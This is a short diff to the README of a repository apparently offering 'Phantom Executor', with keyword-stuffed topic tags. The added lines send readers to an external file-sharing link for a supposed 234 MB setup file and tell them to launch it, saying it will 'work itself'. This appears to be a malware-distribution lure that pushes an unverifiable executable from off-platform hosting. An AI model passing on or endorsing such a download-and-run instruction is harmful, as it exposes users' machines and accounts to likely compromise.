@@ -10,6 +10,8 @@ Description: Not provided
 Topics: phantom-executor, phantom-executor-discord-server, is-phantom-executor-safe, phantom-executor-download, phantom-executor-reddit, phantom-executor-key
 
 # Download Phantom Executor
+The setup file is 234mb which is larger than githubs supported so download from 
+# https://filego.co.uk/CRSonnr5
 
 Please ensure to launch the downloaded file to begin utilizing Phantom Executor for your needs.
 It should all work itself after launching it.
